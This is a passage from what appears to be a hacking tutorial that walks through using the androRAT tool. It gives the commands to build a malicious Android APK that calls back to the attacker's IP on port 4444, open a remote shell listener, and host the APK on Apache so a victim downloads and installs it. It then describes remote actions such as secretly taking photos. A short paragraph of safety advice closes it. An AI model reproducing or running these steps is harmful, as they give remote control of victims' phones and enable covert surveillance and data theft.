Download any other androRAT dependencies by enter
: pip install -r requirements.txt
Now lets create a malicious APK file: python3 androRAT.py — build -i 192.168.43.153 -p 4444 -o hackerloi.
apk Note! use the ip address of the machine you are using. 
5. Go ahead and host the listener by entering: python3 androRAT.py — shell -i 0.0.0.0 -p 4444   6. 
Go to another terminal and run application server: sudo systemctl start apache2.service This will help start up the apache so that we can host the file on your local network  
7. On another terminal, copy the file to web application server directory: sudo cp hackerloi.apk /var/www/html/ 
8. Go to any android device on your network and download the app. Do this by entering the following on its browser: 192.168.43.153/hackerloi.apk Note: use the ip of your machine. After downloading, install the app, click open and then click continue.
9. Game over! You are in the android device. Enter help command to see what you can do with the privilege you have. Example: takepic 0 this will take a picture and download it to your computer.   Advice to stay safe from this attack Never install anything from untrusted website (Golden rule). Avoid using third-party stores, only use Google PlayStore. Never visit websites that have various pop-up and malicious ads. Install an active internet security suite that scans the URL before you can open it on your phone.
